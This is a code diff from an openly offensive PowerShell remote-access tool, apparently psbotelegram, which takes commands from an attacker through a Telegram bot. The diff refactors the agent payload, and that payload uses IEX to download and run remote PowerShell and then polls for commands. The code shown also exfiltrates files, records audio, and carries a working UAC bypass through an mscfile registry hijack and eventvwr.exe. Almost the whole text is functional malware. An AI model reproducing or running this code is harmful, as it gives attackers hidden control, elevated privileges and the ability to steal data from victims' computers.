@@ -1,6 +1,8 @@
 ########################################################## Agent Bot Code ##########################################################
 
-$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ;$bot = [string]$bot[3];$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" 
+function create_agent {param ($botkey,$chat_id)
+$agent_bot = '[string]$botkey = "your_token";[string]$bot_Master_ID = "your_chat_id";[int]$delay = "your_delay";IEX (Invoke-WebRequest "https://raw.githubusercontent.com/hackplayers/psbotelegram/master/Functions.ps1").content;$chat_id = $bot_Master_ID ; $getMeLink = "https://api.telegram.org/bot$botkey/getMe" ; $bot = $getMeLink -split "/" ;$bot = [string]$bot[3];$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates";[int]$first_connect = "1";while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$offset} | ConvertFrom-Json;$l = $json.result.length;$i = 0;if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected con bypassuac :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1};while ($i -lt $l) {$offset = $json.result[$i].update_id + 1; $comando = $json.result[$i].message.text;test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect;$i++} ;Start-Sleep -s $delay ;$first_connect++ }' ; $agent_bot = $agent_bot -replace "your_token", "$botkey" -replace "your_chat_id", "$chat_id" -replace "your_delay", "1" ; return $agent_bot}
+
 
 ################################################ Cargamos funciones de otros proyectos ########################################################################
 
@@ -148,7 +150,7 @@ function BypassUAC-CyberVaca {param ([string]$comando)
 $ruta = $env:USERPROFILE + "\appdata\local\temp\1\temp.ps1" ; $comando  | Out-File -Encoding ascii $ruta 
 New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open | Out-Null ; New-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command | Out-Null 
 $key = "registry::HKEY_CURRENT_USER\SOFTWARE\Classes\mscfile\shell\open\command" ; $modifica = "c:\Windows\system32\WindowsPowerShell\v1.0\powershell -executionpolicy bypass -file $ruta" ; set-item $Key $modifica
-sleep -Seconds 3 ; Start-Process eventvwr.exe ; sleep -Seconds 3
+Start-Process eventvwr.exe ; sleep -Seconds 3
 Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\ ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile\shell ; Remove-Item -Path registry::HKEY_CURRENT_USER\Software\Classes\mscfile ; sleep -Seconds 10; Remove-Item $ruta }
 
 
@@ -178,6 +180,6 @@ function test-command {param ($comando="",$botkey="",$chat_id="",$first_connect=
  if ($comando -like "/Download*") {$file = $comando -replace "/Download ","" ; bot-send -file $file -botkey $botkey -chat_id $chat_id}
  if ($chat_id -eq $null -or $chat_id -eq "") {$chat_id = (bot-public).chat_id}
  if ($comando -like "/Audio*") {$segundos = $comando -replace "/Audio ","";graba-audio -botkey $botkey -chat_id $chat_id -segundos $segundos}
- if ($comando -like "/BypassUAC") {$id = (Get-Process powershell).Id; BypassUAC-CyberVaca -comando $agent_bot -asjob;$texto = "Ejecutado el BypassUAC, espere la nueva conexion del BOT";envia-mensaje -text $texto -botkey $botkey -chat $chat_id;  exit}
+ if ($comando -like "/BypassUAC") {$id = (Get-Process powershell).Id;$agent_bot = create_agent -botkey $botkey -chat_id $chat_id; BypassUAC-CyberVaca -comando $agent_bot -asjob;$texto = "Ejecutado el BypassUAC, espere la nueva conexion del BOT";envia-mensaje -text $texto -botkey $botkey -chat $chat_id;  exit}
 
 }
